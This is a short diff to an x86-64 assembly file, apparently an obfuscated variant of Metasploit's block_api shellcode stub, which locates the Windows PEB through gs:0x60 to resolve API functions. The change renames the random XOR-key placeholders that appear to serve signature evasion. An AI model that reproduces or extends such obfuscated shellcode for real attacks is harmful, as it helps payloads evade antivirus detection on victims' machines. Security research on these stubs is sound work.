@@ -15,10 +15,10 @@ metasploit_block_api:
     xor rdx,rdx
     xor rax,0x9f
     mov rax,[gs:rax] ; 0x60
-    xor rax,%RANDOM_1%
+    xor rax,%RANDOM__1%
     push rcx
     mov rdx,rax
-    xor rdx,%RANDOM_1%
+    xor rdx,%RANDOM__1%
     ; mov rdx,[rax+0x60]
     mov rdx,[rdx+0x18]
     xor rdx,rax
@@ -104,7 +104,7 @@ final:
     pop r10
     sub rsp,byte 0x20
     push r10
-    xor rax,%RANDOM_2%
+    xor rax,%RANDOM__2%
     jmp rax 
 
 pre_load_next_module:
